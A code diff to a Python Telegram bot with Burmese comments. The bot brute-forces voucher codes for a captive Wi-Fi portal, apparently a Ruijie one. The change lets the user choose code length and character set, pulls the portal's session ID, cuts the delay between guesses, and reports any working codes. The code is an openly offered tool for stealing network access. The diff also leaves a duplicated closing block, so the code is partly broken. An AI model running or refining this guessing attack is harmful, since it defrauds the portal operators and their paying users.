@@ -175,14 +175,12 @@ async def _l_v(session, session_id, voucher, tracker=None, is_recheck=False):
         return "ERROR"
 
 class _V_C_:
-    """Voucher ကုဒ်များကို အမြန်နှုန်းမြှင့် အလိုအလျောက် ရှာဖွေပေးမည့် Multi-tasking Engine"""
-    def __init__(self, mode, code_length):
-        self.mode = mode
-        self.code_length = code_length
-        self.file = "failed.txt"
+    """အသုံးပြုသူ ရွေးချယ်သည့် ပုံစံအတိုင်း Voucher ကုဒ်များကို ထုတ်ပေးပြီး တိုက်စစ်မည့် စနစ်သစ်"""
+    def __init__(self, mode_str):
+        # mode_str အနေဖြင့် '6d', '7d', '9d', '6mix' စသည်ဖြင့် လက်ခံမည်
+        self.mode_str = mode_str.lower()
         try: 
-            with open(".session_url", "r") as f:
-                self.session_url = f.read().strip()
+            with open(".session_url", "r") as f: self.session_url = f.read().strip()
         except: 
             self.session_url = None
 
@@ -192,35 +190,47 @@ class _V_C_:
             if update: await update.message.reply_text(msg)
             return
 
-        msg = "🎫 **Voucher Searching Engine စတင်ပါပြီ...**\nကုဒ်များကို အလိုအလျောက် စမ်းသပ်ရှာဖွေနေပါသည်။"
+        # အသုံးပြုသူ ရွေးချယ်လိုက်သည့် အမျိုးအစားအလိုက် Generator သတ်မှတ်ခြင်း
+        length = 6
+        char_set = string.digits
+        type_name = "ဂဏန်းသီးသန့်"
+
+        if '7' in self.mode_str: length = 7
+        elif '9' in self.mode_str: length = 9
+        
+        if 'mix' in self.mode_str:
+            char_set = string.ascii_lowercase + string.digits
+            type_name = "a-z နှင့် ဂဏန်းတွဲလျက်"
+
+        msg = f"🎫 **Voucher Searching Engine စတင်ပါပြီ...**\n🎯 ပုံစံ: `{length} လုံးမြောက် ({type_name})` ဖြင့် စမ်းသပ်နေပါသည်။"
         if update: await update.message.reply_text(msg, parse_mode="Markdown")
         
-        # 🔗 လင့်ခ်ထဲမှ Session ID ကို ထုတ်ယူခြင်း
         session_match = re.search(r"sessionId=([a-zA-Z0-9]+)", self.session_url)
         session_id = session_match.group(1) if session_match else None
         
         if not session_id:
-            if update: await update.message.reply_text("❌ Valid Session ID မတွေ့ရှိပါ။ Portal Link ပြန်ထည့်ပါ။")
+            if update: await update.message.reply_text("❌ Session ID မတွေ့ပါ။ Portal Link ပြန်ထည့်ပါ။")
             return
 
-        # 🚀 တကယ့် အလိုအလျောက် ကုဒ်ထုတ်ပြီး စစ်ဆေးပေးမည့် လုပ်ငန်းစဉ် Loop
         async with aiohttp.ClientSession() as session:
             found_count = 0
-            # နမူနာအနေဖြင့် ကုဒ်အကြိမ်ရေ ၅၀ စမ်းသပ်ရှာဖွေမည့် Loop ပတ်လမ်းကြောင်း
+            # အကြိမ်ရေ ၅၀ စမ်းသပ်မည့် loop
             for _ in range(50): 
-                # Ruijie ပုံမှန်သုံးလေ့ရှိသော ဂဏန်း ၆ လုံး/ ၈ လုံး random ကုဒ်ထုတ်ခြင်း
-                random_code = "".join(random.choices(string.digits, k=self.code_length))
+                # အသုံးပြုသူ ရွေးချယ်ထားသည့် သတ်မှတ်ချက်အတိုင်း Random ကုဒ်ထုတ်ခြင်း
+                random_code = "".join(random.choices(char_set, k=length))
                 
-                # အပိုင်း (၄) ပါ တိုက်စစ်သည့် _l_v function သို့ ပို့ဆောင်ခြင်း
                 status = await _l_v(session, session_id, random_code)
                 
                 if status in ["SUCCESS", "LIMITED"]:
                     found_count += 1
-                    success_msg = f"🎉 **Voucher အသစ် ရှာဖွေတွေ့ရှိပါသည်!**\n🎫 **Code:** `{random_code}`\n📊 **အခြေအနေ:** {status}"
+                    success_msg = f"🎉 **Voucher အသစ် တွေ့ရှိပါသည်!**\n🎫 **Code:** `{random_code}`\n📊 **အခြေအနေ:** {status}"
                     if update: await update.message.reply_text(success_msg, parse_mode="Markdown")
-                    print(f"{_g_}[✔] Found: {random_code} ({status}){_w_}")
                 
-                await asyncio.sleep(0.2) # Server မကျစေရန် စက္ကန့်ပိုင်းခွဲ၍ စောင့်ခြင်း
+                await asyncio.sleep(0.1) 
+                
+            final_msg = f"🏁 **Voucher ရှာဖွေမှု ပြီးဆုံးပါပြီ။**\n🎯 ရှာဖွေတွေ့ရှိမှုစုစုပေါင်း: {found_count} ခု"
+            if update: await update.message.reply_text(final_msg, parse_mode="Markdown")
+
                 
             final_msg = f"🏁 **Voucher ရှာဖွေမှု ပြီးဆုံးပါပြီ။**\n🎯 ရှာဖွေတွေ့ရှိမှုစုစုပေါင်း: {found_count} ခု"
             if update: await update.message.reply_text(final_msg, parse_mode="Markdown")
